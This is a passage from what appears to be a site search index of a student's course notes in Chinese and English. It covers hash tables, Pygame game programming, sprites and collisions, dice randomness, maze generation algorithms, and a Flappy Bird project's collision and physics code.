</ul>"},{"location":"cs/fds/chapter7/#hash-function","title":"Hash Function","text":"<ul> <li>\u5bb9\u6613\u8ba1\u7b97\uff0c\u5c3d\u91cf\u51cf\u5c11\u78b0\u649e\u3002</li> <li>\u5747\u5300\u5206\u5e03\uff0cuniform hash function\u3002</li> </ul> <p>\u82e5 \\(f(x) = x \\mod \\text{TableSize}\\)\uff0c\u5219 TableSize \u5e94\u8be5\u4e3a\u7d20\u6570\u3002</p>"},{"location":"cs/fds/chapter7/#saparate-chain","title":"Saparate Chain","text":"<p>\u6bcf\u4e2a identifier \u5bf9\u5e94\u4e00\u4e2a\u94fe\u8868\u3002</p> <p>\u6b64\u65f6\u5b9a\u4e49 loading density \u4e3a \\(n/b\\)\u3002</p>"},{"location":"cs/fds/chapter7/#open-addressing","title":"Open Addressing","text":"<p>\u5982\u679c\u53d1\u751f\u78b0\u649e\uff0c\u5219\u5bfb\u627e\u4e0b\u4e00\u4e2a\u7a7a\u7684\u4f4d\u7f6e\u3002\u4e0d\u65ad\u63a2\u6d4b\u5176\u540e\u7b2c \\(f(0), f(1), f(2), \\dots\\) \u4e2a\u4f4d\u7f6e\u662f\u5426\u4e3a\u6709\u4f4d\u7f6e\u3002</p> <p>\u8981\u6c42 loading density &lt; 0.5</p>"},{"location":"cs/fds/chapter7/#linear-probing","title":"Linear Probing","text":"<p>\\(f(i) = i\\)\uff0c\\(i = 0, 1, 2, \\dots\\)\u3002</p> <p>\u4f1a\u5bfc\u81f4 clustering\uff0c\u5373\u4e00\u65e6\u53d1\u751f\u78b0\u649e\uff0c\u540e\u9762\u7684\u78b0\u649e\u6982\u7387\u4f1a\u589e\u5927\u3002</p>"},{"location":"cs/fds/chapter7/#quadratic-probing","title":"Quadratic Probing","text":"<p>\\(f(i) = i^2\\)\uff0c\\(i = 0, 1, 2, \\dots\\)\u3002</p> <p>\u5f53 TableSize \u4e3a\u7d20\u6570\uff0c\u4e14 loading density &lt; 0.5 \u65f6\uff0c\u603b\u80fd\u627e\u5230\u7a7a\u4f4d\u7f6e\u3002</p>"},{"location":"cs/fds/chapter7/#double-hashing","title":"Double Hashing","text":"<p>\\(f(i) = i \\times hash_2(x)\\)\uff0c\\(i = 0, 1, 2, \\dots\\)\u3002</p> <p>\u4e00\u822c\u9009\u62e9 \\(hash_2(x) = R - (x \\% R)\\)\uff0c\u5176\u4e2d \\(R\\) \u4e3a\u7d20\u6570\uff0c\u4e14 \\(R &lt; \\text{TableSize}\\)\u3002</p>"},{"location":"cs/fds/chapter7/#rehashing","title":"Rehashing","text":"<p>\u65b0\u5efa\u4e00\u4e2a\u7ea6\u4e24\u500d\u5927\u5c0f\uff08\u4e00\u822c\u9009\u62e9 \\(\\text{next_prime}(2*n)\\)\uff09\u7684\u54c8\u5e0c\u8868\uff0c\u7136\u540e\u5c06\u539f\u6765\u7684\u6570\u636e\u63d2\u5165\u65b0\u7684\u54c8\u5e0c\u8868\u4e2d\u3002</p> <p>Rehashing \u7684\u65f6\u673a\uff1a</p> <ul> <li>\u5f53 loading density &gt; 0.5 \u65f6</li> <li>\u5f53 loading density \u8d85\u8fc7\u4e00\u5b9a\u503c\u65f6</li> <li>\u5f53\u63d2\u5165\u5931\u8d25\u65f6</li> </ul> <p>\u8bbe \\(n\\) \u4e3a\u5f53\u524d\u54c8\u5e0c\u8868\u4e2d\u7684\u6807\u8bc6\u7b26\u4e2a\u6570\uff0c\u5219 rehashing \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(n)\\)\u3002</p>"},{"location":"cs/fds/chapter7/#_1","title":"\u9519\u9898\u6574\u7406","text":"<p>Question 1</p> <p>The average search time of searching a hash table with N elements is Can not be determined.</p> <p>Question 2</p> <p>Suppose that the numbers <code>{4371, 1323, 6173, 4199, 4344, 9679, 1989}</code> are hashed into a table of size 10 with the hash function \\(h(X)=X\\%10\\), and hence have indices <code>{1, 3, 4, 9, 5, 0, 2}</code>. What are their indices after rehashing using \\(h(X)=X\\%\\text{TableSize}\\) with linear probing?</p> <p>rehashing \u65b0\u5efa\u54c8\u5e0c\u8868\u5927\u5c0f\u4e3a 23.</p>"},{"location":"cs/game/","title":"\u8f6f\u4ef6\u5de5\u7a0b\u4e0e\u6e38\u620f\u8bbe\u8ba1\uff1a\u7b97\u6cd5\u5728\u6e38\u620f\u8bbe\u8ba1\u4e2d\u7684\u5e94\u7528","text":"<p>\u56fd\u9645\u5316\u8bfe\u7a0b</p>"},{"location":"cs/game/chapter1/","title":"Introductions","text":""},{"location":"cs/game/chapter1/#taxonomies","title":"Taxonomies \u5206\u7c7b","text":"<ul> <li>By genre: action, adventure, role-playing, simulation, strategy, sports, puzzle, idle, etc.</li> <li>By platform: PC, console, mobile, VR, etc.</li> <li>By purpose: entertainment, education, training, marketing, etc.</li> <li>By controller: touchscreens, motion capture, gamepads, keyboards, etc.</li> </ul>"},{"location":"cs/game/chapter1/#pygame","title":"Pygame","text":""},{"location":"cs/game/chapter1/#modules","title":"Modules","text":""},{"location":"cs/game/chapter1/#game-loop","title":"Game Loop","text":"intro1.py<pre><code>pygame.init()\n\nsize = width, height = 1024, 768\nspeed = [3,2]\nblack = (0, 0, 0)\n\nscreen = pygame.display.set_mode(size)\npygame.display.set_caption('Logo Bouncer')\nlogo = pygame.image.load(logo_file)\nlogo_width, logo_height = logo.get_size()\nlogo_x = logo_y = 0\n\nrunning = True\nclock = pygame.time.Clock()\nwhile running:\n    clock.tick(30)\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    logo_x += speed[0]\n    logo_y += speed[1]\n\n    if logo_x &lt; 0 or logo_x + logo_width &gt; width:\n        speed[0] = -speed[0]\n    if logo_y &lt; 0 or logo_y + logo_height &gt; height:\n        speed[1] = -speed[1]\n\n    screen.fill(black)\n    screen.blit(logo, (logo_x, logo_y))\n    pygame.display.flip()\n</code></pre> <p>The structure of <code>intro1.py</code>:</p> <ul> <li>some initialization stuff</li> <li>a game loop: Game ends when loop is exited</li> </ul> <p>game loop:</p> <ul> <li>check for updates (from user input, network, etc.)</li> <li>update game state</li> <li>draw the next frame</li> </ul>"},{"location":"cs/game/chapter1/#frame","title":"Frame","text":"<p>One picture is rendered (calculated and shown to user) each time around the loop.</p> <p>FPS: frames per second</p>"},{"location":"cs/game/chapter1/#event-queue","title":"Event Queue","text":"<pre><code># Example event processing\ndef get_inputs():\n    done = left = right = False\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            done = True\n        elif event.type == pygame.KEYDOWN:\n            if event.key == pygame.K_ESCAPE:\n                done = True\n            elif event.key == pygame.K_RIGHT:\n                right = True\n            elif event.key == pygame.K_LEFT:\n                left = True\n    return (left, right, done)\n</code></pre> <p>\u4e00\u6b21 game loop \u4e2d\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u4e8b\u4ef6\uff0c\u5982\u952e\u76d8\u6309\u952e\u3001\u9f20\u6807\u70b9\u51fb\u7b49\uff0c\u9700\u8981\u9010\u4e2a\u5904\u7406\u3002</p>"},{"location":"cs/game/chapter1/#mvc-model-view-controller","title":"MVC: model-view-controller","text":""},{"location":"cs/game/chapter1/#model","title":"Model","text":"<p>Manages the data and operations on the data.</p> <p>Provides a well-defined interface to the data.</p>"},{"location":"cs/game/chapter1/#view","title":"View","text":"<p>Provides a way to visualize the data: Draw the frame, make the music, etc.</p>"},{"location":"cs/game/chapter1/#controller","title":"Controller","text":"<p>Maps input actions to model or view actions.</p>"},{"location":"cs/game/chapter1/#object-oriented-modelview","title":"Object-oriented model/view \u9762\u5411\u5bf9\u8c61","text":"<p>Each object knows its own state, so is part of the model.</p> <p>Each object knows how to draw itself, so is part of the view. have a <code>draw</code> method.</p>"},{"location":"cs/game/chapter1/#graphic-primitives","title":"Graphic Primitives \u56fe\u5f62\u57fa\u5143","text":"<p>An engine provides some level of graphic algorithms to be embedded in your code. Pygame is an engine for 2D games.</p> <p>Each pixel has a color. Usually formed by mixing 8-bit values for red, green, blue and alpha.</p> <p>In Python and Pygame, the color is a tuple or a hex string.</p> <pre><code>Red = (255, 0, 0)\nRed = '0xFF0000'\n</code></pre>"},{"location":"cs/game/chapter1/#alpha-channel","title":"Alpha Channel","text":"<p>An extra 8-bits specifies the amount of transparency.</p> <ul> <li>0 = transparent. \u5b8c\u5168\u900f\u660e</li> <li>255 = opaque. \u5b8c\u5168\u4e0d\u900f\u660e</li> </ul>"},{"location":"cs/game/chapter1/#the-surface","title":"The Surface","text":"<p>In Pygame, a surface is a place to draw.</p> <p>Special surface: the display surface -- will be visible to the user in the game window.</p> <pre><code>display_surface = pygame.display.set_mode((800, 600))\n</code></pre> <p>Other surfaces can be created and drawn on the display surface.</p> <pre><code>background = pygame.Surface(display_surface.get_size())\ndisplay_surface.blit(background, (0, 0))\n</code></pre>"},{"location":"cs/game/chapter1/#surface-operations","title":"Surface Operations","text":"<ul> <li> <p><code>get_at</code>, <code>set_at</code>: get or set the color of a pixel</p> <p><pre><code>color = background.get_at((100, 100))\nbackground.set_at((100, 100), color)\n</code></pre> - <code>fill</code>: fill the surface with a color</p> <p><pre><code>background.fill((255, 255, 255))\n</code></pre> - And a line can be drawn between two points with <code>pygame.draw.line</code>.</p> <pre><code>pygame.draw.line(surface, color, (x0, y0), (x1, y1))\n</code></pre> </li> <li> <p><code>pygame.draw.arc</code>: draw an elliptical or circular arc from <code>start_angle</code> to <code>stop_angle</code> (in radians)</p> <pre><code>pygame.draw.arc(surface, color, rect, start_angle, stop_angle, width)\n</code></pre> <p>Position and dimensions are specified by the rect parameter, a bounding box. \u4f4d\u7f6e\u548c\u5c3a\u5bf8\u7531 rect \u53c2\u6570\u6307\u5b9a\uff0c\u5728\u4e00\u4e2a\u8fb9\u754c\u6846\u5185\u3002</p> </li> <li> <p><code>pygame.draw.lines</code>: draw a series of connected lines</p> <pre><code>pygame.draw.lines(surface, color, closed, pointlist, width)\n</code></pre> <p>If <code>closed</code> is True, will also connect the last point back to the first.</p> </li> <li> <p><code>pygame.draw.polygon</code>: draw a polygon</p> <pre><code>pygame.draw.polygon(surface, color, pointlist)\n</code></pre> <p>polygon acts similarly, connecting points from a list, but then it fills in the enclosed space. </p> <p>\u4e0e lines \u8bbe\u7f6e closed \u53c2\u6570\u4e3a True \u7c7b\u4f3c\uff0cpolygon \u4f1a\u81ea\u52a8\u8fde\u63a5\u6700\u540e\u4e00\u4e2a\u70b9\u548c\u7b2c\u4e00\u4e2a\u70b9\u3002\u82e5\u672a\u8bbe\u7f6e width \u53c2\u6570\uff0c\u5219\u4f1a\u586b\u5145\u591a\u8fb9\u5f62\u3002</p> </li> <li> <p><code>pygame.draw.circle</code>: draw a circle</p> <pre><code>pygame.draw.circle(surface, color, center, radius)\n</code></pre> <p>\u4e0e polygon \u7c7b\u4f3c\uff0ccircle \u4f1a\u586b\u5145\u5706\u5f62\u3002</p> </li> </ul>"},{"location":"cs/game/chapter1/#draw-module","title":"Draw module","text":""},{"location":"cs/game/chapter1/#rect","title":"Rect","text":"<p>Rects are defined by four values.</p> <pre><code>rect = pygame.Rect(x, y, width, height)\n</code></pre>"},{"location":"cs/game/chapter1/#rect-methods","title":"Rect Methods","text":"<ul> <li><code>copy</code>: return a new rect with the same values</li> <li><code>move</code>: return a new rect moved by a given offset</li> <li><code>move_ip</code>: move the rect by a given offset</li> <li><code>inflate</code>: return a new rect with the size changed by a given amount</li> <li><code>clip</code>: return a new rect that is the intersection of two rects</li> <li><code>union</code>: return a new rect that is the union of two rects</li> <li><code>contains</code>: check if a rect is completely inside another</li> <li><code>collidepoint</code>: check if a point is inside the rect</li> <li><code>colliderect</code>: check if two rects overlap</li> <li><code>collidelist</code>: check if a rect overlaps with any in a list</li> </ul>"},{"location":"cs/game/chapter1/#draw","title":"Draw","text":"<ul> <li> <p><code>pygame.draw.rect</code>: draw a rectangle</p> <pre><code>pygame.draw.rect(surface, color, rect, width)\n</code></pre> <p>If width is 0, the rectangle will be filled.</p> </li> <li> <p><code>pygame.draw.ellipse</code>: draw an ellipse. \u77e9\u5f62\u7684\u5185\u5207\u692d\u5706</p> <pre><code>pygame.draw.ellipse(surface, color, rect, width)\n</code></pre> <p>If width is 0, the ellipse will be filled.</p> </li> </ul>"},{"location":"cs/game/chapter1/#images-and-blit","title":"Images and Blit","text":""},{"location":"cs/game/chapter1/#image-load-save","title":"Image Load / Save","text":"<ul> <li> <p><code>pygame.image.load</code>: load an image from a file</p> <p><pre><code>surface = pygame.image.load(filename)\n</code></pre> - <code>pygame.image.save</code>: save an image to a file</p> <p><pre><code>pygame.image.save(surface, filename)\n</code></pre> - <code>pygame.surface.convert</code>: convert a surface to a new format</p> <pre><code>new_surface = surface.convert()\n</code></pre> <p>convert will change the format of a surface to match the display surface.</p> </li> </ul>"},{"location":"cs/game/chapter1/#blit","title":"BLIT","text":"<p>BLIT \"pastes\" one image into another.</p> <p>The Surface object has a blit method for pasting another image (or portion) into the image</p> <pre><code>surface.blit(source, dest, area=None, special_flags=0)\n</code></pre> <ul> <li>source: the surface to be pasted</li> <li>dest: the position to paste the source</li> <li>area: can be a rect to paste only a portion of the source, only the area that intersects with the rect in the source will be pasted</li> <li>special_flags: can be used to control the pasting</li> </ul>"},{"location":"cs/game/chapter1/#colorkey","title":"Colorkey","text":"<p>Colorkey is a special color that is ignored when blitting.</p> <pre><code>surface.set_colorkey(color)\n</code></pre>"},{"location":"cs/game/chapter1/#surface-transforms","title":"Surface Transforms","text":"<p><code>pygame.transform</code> module has methods to manipulate a surface. rotate / scale / chop / greyscale / ...</p>"},{"location":"cs/game/chapter2/","title":"Sprites and Randomness","text":""},{"location":"cs/game/chapter2/#fonts-and-text-renders","title":"Fonts and Text Renders","text":""},{"location":"cs/game/chapter2/#font-module","title":"Font Module","text":"<p>Pygame renders text to a surface with the Font module.</p> <p>Font module has methods to locate and load a font as a Font object.</p> <ul> <li> <p><code>pygame.font.get_fonts</code>: get a list of available fonts</p> </li> <li> <p><code>pygame.font.SysFont</code>: get a Font object from the system fonts</p> <pre><code>font = pygame.font.SysFont(name, size, bold=False, italic=False)\n</code></pre> <ul> <li>name: the name of the font. <code>None</code> for the default font.</li> <li>size: the size of the font</li> <li>bold: True if the font should be bold</li> <li>italic: True if the font should be italic</li> </ul> </li> <li> <p><code>pygame.font.Font</code>: get a Font object from a file</p> <pre><code>font = pygame.font.Font(filename, size)\n</code></pre> <ul> <li>filename: the path to the font file</li> <li>size: the size of the font</li> </ul> </li> </ul>"},{"location":"cs/game/chapter2/#text-rendering","title":"Text Rendering","text":"<ul> <li> <p><code>Font.render</code>: render text to a surface</p> <pre><code>surface = font.render(text, antialias, color, background=None)\n</code></pre> <ul> <li>text: the text to render</li> <li>antialias: True for antialiased text. \u8fb9\u7f18\u5e73\u6ed1</li> <li>color: the color of the text</li> <li>background: the color of the background</li> </ul> </li> <li> <p><code>Font.size</code>: get the size of the text</p> <pre><code>width, height = font.size(text)\n</code></pre> </li> <li> <p><code>Font.get_height</code>: get the height of the font. \u5b57\u4f53\u9ad8\u5ea6</p> <pre><code>height = font.get_height()\n</code></pre> </li> <li> <p><code>Font.get_linesize</code>: get the height of a line of text. \u884c\u95f4\u8ddd</p> <pre><code>linesize = font.get_linesize()\n</code></pre> </li> <li> <p><code>Font.metrics</code>: get the metrics of the font. \u5b57\u4f53\u5ea6\u91cf</p> <pre><code>metrics = font.metrics(text)\n</code></pre> <p>Returns a list with one tuple per character in the text string.</p> <p>Each tuple has information on exact sizes and placement of that character.</p> </li> </ul>"},{"location":"cs/game/chapter2/#sprites","title":"Sprites","text":"<p>Pygame's <code>Sprite</code> class is intended to assist to make objects of the on-screen elements.</p> <p><code>Group</code> classes (there are several) are useful to manage sprites.</p> <p>Need to subclass <code>Sprite</code> to create a sprite.</p> <pre><code>class Mario(pygame.sprite.Sprite):\n\n    def __init__(self, pos, sprites_image):\n        pygame.sprite.Sprite.__init__(self)\n\n        self.image = pygame.Surface((29,47))        \n        image_surf = pygame.image.load(sprites_image).convert()\n        self.image.blit(image_surf, (0,0), (4, 13, 29, 47))\n        self.image.set_colorkey((255,255,255))\n        self.rect = self.image.get_rect(topleft=pos)     \n\n    def update(self, click):\n        if click:\n            self.rect.center = click\n\n    def draw(self, surface):\n        surface.blit(self.image, self.rect)\n</code></pre>"},{"location":"cs/game/chapter2/#sprite-groups","title":"Sprite Groups","text":"<p><code>Group</code> classes are used to manage sprites.</p> <ul> <li> <p><code>pygame.sprite.Group</code>: a simple group</p> <pre><code>group = pygame.sprite.Group()\n</code></pre> </li> <li> <p><code>Group.add</code>: add a sprite to the group</p> <pre><code>group.add(sprite)\n</code></pre> </li> <li> <p><code>Group.remove</code>: remove a sprite from the group</p> <pre><code>group.remove(sprite)\n</code></pre> </li> <li> <p><code>Group.draw</code>: draw all sprites in the group</p> <pre><code>group.draw(surface)\n</code></pre> </li> <li> <p><code>Group.update</code>: update all sprites in the group</p> <pre><code>group.update(*args)\n</code></pre> </li> <li> <p><code>Sprite.kill</code>: remove the sprite from all groups</p> <pre><code>sprite.kill()\n</code></pre> </li> <li> <p><code>Group.clear</code>: draw from the background into the destination at every place a sprite was last drawn</p> <pre><code>group.clear(surface, background)\n</code></pre> <p>just erase where the sprites were, then update them, then redraw them.</p> <p>\u4e0d\u7528\u6bcf\u6b21\u5faa\u73af\u90fd\u8bbe\u7f6e <code>background</code>\uff0c\u53ea\u9700\u5728\u6e38\u620f\u5f00\u59cb\u65f6\u8bbe\u7f6e\u4e00\u6b21\u5373\u53ef\u3002</p> </li> </ul>"},{"location":"cs/game/chapter2/#other-classes","title":"Other Classes","text":"<ul> <li> <p><code>RenderUpdates</code>: a group that keeps track of the dirty rectangles</p> <pre><code>group = pygame.sprite.RenderUpdates()\n</code></pre> </li> <li> <p><code>OrderedUpdates</code>: a group that keeps track of the order of the sprites as they are added</p> <pre><code>group = pygame.sprite.OrderedUpdates()\n</code></pre> </li> <li> <p><code>LayeredUpdates</code>: a Group that has layers, sort of a group within the Group</p> <pre><code>group = pygame.sprite.LayeredUpdates()\n</code></pre> </li> <li> <p><code>GroupSingle</code>: a group that only holds one sprite</p> <pre><code>group = pygame.sprite.GroupSingle()\n</code></pre> <p>If a new sprite is added, the old one is ejected.</p> </li> </ul>"},{"location":"cs/game/chapter2/#collisions","title":"Collisions","text":"<p>A collision occurs when two sprites occupy the same space.</p> <ul> <li> <p><code>pygame.sprite.collide_rect</code>: check if the rects of two sprites overlap, return a boolean</p> <pre><code>collide = pygame.sprite.collide_rect(sprite1, sprite2)\n</code></pre> <p>sprite1 and sprite2 must have a <code>rect</code> attribute.</p> </li> <li> <p><code>pygame.sprite.collide_rect_ratio</code>: multiplies the size of the rects by a floating point value before looking for overlap</p> <pre><code>collide = pygame.sprite.collide_rect_ratio(ratio)(sprite1, sprite2)\n</code></pre> </li> <li> <p><code>pygame.sprite.collide_circle</code>: check if the circles of two sprites overlap, return a boolean</p> <pre><code>collide = pygame.sprite.collide_circle(sprite1, sprite2)\n</code></pre> <p>sprite1 and sprite2 must have a <code>rect</code> attribute and an optional <code>radius</code> attribute.</p> </li> <li> <p><code>pygame.sprite.collide_circle_ratio</code>: as <code>collide_rect_ratio</code>, but for circles</p> </li> <li> <p><code>pygame.sprite.collide_mask</code>: check if the masks of two sprites overlap, return a boolean</p> <pre><code>collide = pygame.sprite.collide_mask(sprite1, sprite2)\n</code></pre> <p>sprite1 and sprite2 must have a <code>rect</code> attribute and an optional <code>mask</code> attribute.</p> </li> <li> <p><code>pygame.sprite.spritecollide</code>: returns a list of sprites in the group that collide</p> <pre><code>collide = pygame.sprite.spritecollide(sprite, group, dokill, collided=None)\n</code></pre> <ul> <li>dokill: if True, the sprites that collide will be removed from the group</li> <li>collided: a callback function to check for collisions</li> </ul> </li> <li> <p><code>pygame.sprite.groupcollide</code>: tests for collisions between two groups</p> <pre><code>collide = pygame.sprite.groupcollide(group1, group2, dokill1, dokill2, collided=None)\n</code></pre> <p>Returns a dictionary with every sprite in group1 as a key and a list of every sprite in group2 that collides with it as the value.</p> <ul> <li>dokill1: if True, the sprites that collide in group1 will be removed</li> <li>dokill2: if True, the sprites that collide in group2 will be removed</li> <li>collided: a callback function to check for collisions</li> </ul> </li> </ul>"},{"location":"cs/game/chapter2/#animation","title":"Animation","text":"<p>Show a quick sequence of images to the user, 30-72 frames per second or so.</p> <ul> <li> <p>Slower loop: use <code>pygame.time.Clock</code> to control the frame rate</p> <pre><code>clock = pygame.time.Clock()\n</code></pre> <pre><code>while running:\n    clock.tick(30) # 30 frames per second\n</code></pre> </li> <li> <p>Measure: The <code>Clock</code> object can also be used to measure the time since the last call</p> <pre><code>time_passed = clock.tick() # milliseconds since the last call\n</code></pre> </li> </ul>"},{"location":"cs/game/chapter2/#randomness","title":"Randomness","text":""},{"location":"cs/game/chapter2/#pseudo-randomness","title":"Pseudo-randomness","text":"<ul> <li> <p>Linear Congruential Generator (LCG)</p> \\[ X_{n+1} = (aX_n + c) \\mod m \\] <p>used in Pseudo-Random Number Generator (PRNG).</p> <p>LCG Cycles: the number of times you can call the LCG before it repeats</p> </li> <li> <p>PRNG: A good PRNG will have carefully chosen constants to ensure the longest possible cycle.</p> <p>other sources of \"randomness\" are usually sampled and mixed in: mouse movements, keyboard presses, etc.</p> </li> </ul>"},{"location":"cs/game/chapter2/#random-distributions","title":"Random Distributions","text":"<p>The distribution of a PRNG or code using a PRNG refers to the chance of attaining each value</p>"},{"location":"cs/game/chapter2/#asymmetric-distributions","title":"Asymmetric Distributions","text":"<p>How can I get a higher chance of values at the upper ranges?</p> <ul> <li> <p>Dropping the lowest roll: Roll twice (or more), pick the higher roll</p> <pre><code>def drop_lowest_roll(number, sides):\n    roll1 = roll_dice(number, sides)\n    roll2 = roll_dice(number, sides)\n    return max(roll1, roll2)\n</code></pre> </li> <li> <p>Drop the lowest dice: roll an extra die and drop the lowest value</p> <pre><code>def drop_lowest_die(number, sides):\n    rolls = []\n    for i in range(number + 1):\n        rolls.append(roll_dice(1, sides))\n    rolls.sort()\n    return sum(rolls[1:])\n</code></pre> </li> <li> <p>Reroll the lowest: roll two dice and then reroll whichever is lowest</p> <pre><code>def reroll_lowest_die(number, sides):\n    rolls = []\n    for i in range(number):\n        rolls.append(roll_dice(1, sides))\n    rolls.sort()\n    rolls[0] = roll_dice(1, sides)\n    return sum(rolls)\n</code></pre> </li> <li> <p>Critical Hits: In a small percentage (5%?) of cases, extra value is added (perhaps by another die roll)</p> <pre><code>def roll_with_critical(number, sides, crit):\n    roll = roll_dice(number, sides)\n    if random.random() &lt; crit:\n        roll += roll_dice(1, sides)\n    return roll\n</code></pre> </li> <li> <p>Arbitrary Distributions: </p> </li> </ul>"},{"location":"cs/game/chapter3/","title":"Maze Algorithms","text":""},{"location":"cs/game/chapter3/#mazes","title":"Mazes","text":""},{"location":"cs/game/chapter3/#classifications","title":"Classifications","text":"<ul> <li>Perfect maze: Has one and only one path between any two cells -- thus plenty of branching, but no loops<ul> <li>Cell: position in the maze, the smallest geographical element of the maze</li> </ul> </li> <li>Unicursal maze: Has no branches, so there is just a single path from beginning to end</li> </ul>"},{"location":"cs/game/chapter3/#maze-generation","title":"Maze Generation","text":""},{"location":"cs/game/chapter3/#binary-tree-algorithm","title":"Binary Tree Algorithm","text":"<p>A wall carving algorithm. Start with a grid of unlinked cells.</p> <ul> <li>\u6bcf\u4e2a\u5355\u5143\u53ef\u80fd\u548c\u53f3\u8fb9\u6216\u8005\u4e0a\u8fb9\u76f8\u8fde\u3002</li> <li>\u6700\u53f3\u8fb9\u4e00\u5217\u548c\u6700\u4e0a\u8fb9\u4e00\u5217\u5206\u522b\u5168\u8054\u901a\u3002</li> </ul> <p>For each cell, randomly carve a passage either north or east.</p>"},{"location":"cs/game/chapter3/#sidewinder-algorithm","title":"Sidewinder Algorithm","text":"<p>Top row: link all cells together.</p> <p>Other rows, collect adjacent cells into \"runs\". Randomly add the next cell to the run, and randomly end the run.</p> <p>Always end the run when there is no cell to the East.</p> <p>When ending the run, link all cells in the run together, and randomly link one cell to the North.</p>"},{"location":"cs/game/chapter3/#aldous-broder-random-walk","title":"Aldous-Broder Random Walk","text":"<p>A random walk algorithm: step from cell to random neighbor to create random paths.</p> <ul> <li>Start at a random cell</li> <li>Move to a random neighbor</li> <li>If the neighbor has not been visited, link the cells and move to the neighbor</li> <li>Repeat until all cells have been visited</li> </ul> <p>Inefficient, need too many steps to generate a maze.</p>"},{"location":"cs/game/chapter3/#bias","title":"Bias","text":"<p>A-B has no bias, then it's a unbiased random walk.</p> <p>An unbiased algorithm will potentially generate any of them -- with a uniform probability distribution over them all.</p> <ul> <li>A-B \u7b97\u6cd5\u6ca1\u6709\u504f\u5411\u6027\uff0c\u751f\u6210\u5404\u79cd\u8ff7\u5bab\u7684\u6982\u7387\u662f\u5747\u5300\u7684\u3002</li> <li>Binary Tree \u548c Sidewinder \u7b97\u6cd5\u6709\u504f\u5411\u6027\uff0c\u751f\u6210\u7684\u8ff7\u5bab\u6709\u7279\u5b9a\u7684\u7279\u5f81\u3002</li> </ul>"},{"location":"cs/game/chapter3/#wilsons-random-walk","title":"Wilson's Random Walk","text":"<p>Also creates mazes with no bias. Also has inefficient performance characteristics.</p> <ul> <li>Choose a random cell and mark it as visited</li> <li>Choose a random unvisited cell and start a random walk from it</li> <li>Perform a loop-erased random walk, choosing a random neighbor at each step</li> <li>If the walk reaches a visited cell, erase the loop and add the path to the maze</li> <li>Repeat until all cells have been visited</li> </ul>"},{"location":"cs/game/chapter3/#recursive-backtracker","title":"Recursive Backtracker","text":"<p>DFS</p> <ul> <li>Start at a random cell</li> <li>Link and move to a random neighbor who is unvisited</li> <li>Anytime a cell has no unvisited neighbors, backtrack to the last cell with unvisited neighbors</li> </ul> <p>Recursive Backtracker leads to mazes with long, twisty paths with few dead ends. And it's biased.</p>"},{"location":"cs/game/chapter3/#maze-solution-algorithms","title":"Maze Solution Algorithms","text":""},{"location":"cs/game/chapter3/#dijkstras-algorithm","title":"Dijkstra's Algorithm","text":"<p>For the maze, the weight of each edge is 1 for linked cells, and infinity for unlinked cells.</p>"},{"location":"cs/game/chapter3/#longest-path","title":"Longest Path","text":"<p>Do Dijkstra's Algorithm twice:</p> <ul> <li>Pick a random cell A as the start</li> <li>Find the cell B that is farthest from A</li> <li>Find the cell C that is farthest from B</li> <li>The path from B to C is the longest path</li> </ul>"},{"location":"cs/game/final/","title":"Flappy Bird","text":""},{"location":"cs/game/final/#overview","title":"Overview","text":"<p>Flappy Bird is a simple game where the player controls a bird, attempting to fly between columns of pipes without hitting them. Players can control the bird by tapping to make it flap its wings and fly upwards.</p>"},{"location":"cs/game/final/#algorithms","title":"Algorithms","text":""},{"location":"cs/game/final/#collision-detection","title":"Collision Detection","text":"<p>Collision detection is used to determine if the bird has hit a pipe or the ground.</p> <p>The implementation uses two methods to detect collisions between two entities:</p> <ol> <li> <p>Axis-aligned bounding box (AABB) collision detection</p> <p>Get the bounding box (rectangle) of the two entities and check if they overlap.</p> <pre><code>self.rect.colliderect(other.rect)\n</code></pre> </li> <li> <p>Pixel-perfect collision detection</p> <p>Check if the two entities have overlapping pixels which are not transparent.</p> <p>We can get the hit mask of an image by checking the alpha channel:</p> <pre><code>@memoize\ndef get_hit_mask(image: pygame.Surface) -&gt; HitMaskType:\n    \"\"\"returns a hit mask using an image's alpha.\"\"\"\n    return list(\n        (\n            list(\n                (\n                    bool(image.get_at((x, y))[3])\n                    for y in range(image.get_height())\n                )\n            )\n            for x in range(image.get_width())\n        )\n    )\n</code></pre> <p>And we can check for pixel-perfect collision using the hit masks:</p> <pre><code>def pixel_collision(\n    rect1: pygame.Rect,\n    rect2: pygame.Rect,\n    hitmask1: HitMaskType,\n    hitmask2: HitMaskType,\n):\n    \"\"\"Checks if two objects collide and not just their rects\"\"\"\n    rect = rect1.clip(rect2)\n\n    if rect.width == 0 or rect.height == 0:\n        return False\n\n    x1, y1 = rect.x - rect1.x, rect.y - rect1.y\n    x2, y2 = rect.x - rect2.x, rect.y - rect2.y\n\n    for x in range(rect.width):\n        for y in range(rect.height):\n            if hitmask1[x1 + x][y1 + y] and hitmask2[x2 + x][y2 + y]:\n                return True\n    return False\n</code></pre> <p>Then when the entity is initialized, we can get the hit mask of the entity:</p> <pre><code>self.hit_mask = get_hit_mask(image) if image else None\n</code></pre> <p>And when we want to check for a collision, we can use the hit mask:</p> <pre><code>pixel_collision(self.rect, other.rect, self.hit_mask, other.hit_mask)\n</code></pre> </li> </ol>"},{"location":"cs/game/final/#physics-simulation","title":"Physics Simulation","text":"<p>The physics simulation is used to calculate the bird's position and velocity, making its falling, flapping and rotation close to real-world physics.</p> <p>The bird has three states:</p> <ol> <li> <p>Simple Harmonic Motion (SHM)</p> <p>The bird oscillates up and down with no rotation when the game has not started.</p> <p>The constants for SHM are defined as:</p> <pre><code>self.vel_y = 1  # player's velocity along Y axis\nself.max_vel_y = 4  # max vel along Y, max descend speed\nself.min_vel_y = -4  # min vel along Y, max ascend speed\nself.acc_y = 0.5  # players downward acceleration\n\nself.rot = 0  # player's current rotation\nself.vel_rot = 0  # player's rotation speed\nself.rot_min = 0  # player's min rotation angle\nself.rot_max = 0  # player's max rotation angle\n</code></pre> <p>In each tick, the bird's position is updated by:</p> <pre><code>def tick_shm(self) -&gt; None:\n    if self.vel_y &gt;= self.max_vel_y or self.vel_y &lt;= self.min_vel_y:\n        # reverse the acceleration when player reaches max/min velocity\n        self.acc_y *= -1\n    self.vel_y += self.acc_y\n    self.y += self.vel_y\n</code></pre> </li> <li> <p>Normal Flight</p> <p>After the game starts, the bird falls due to gravity until the player taps to make it flap its wings.</p> <p>The constants for normal flight are defined as:</p> <pre><code>self.vel_y = 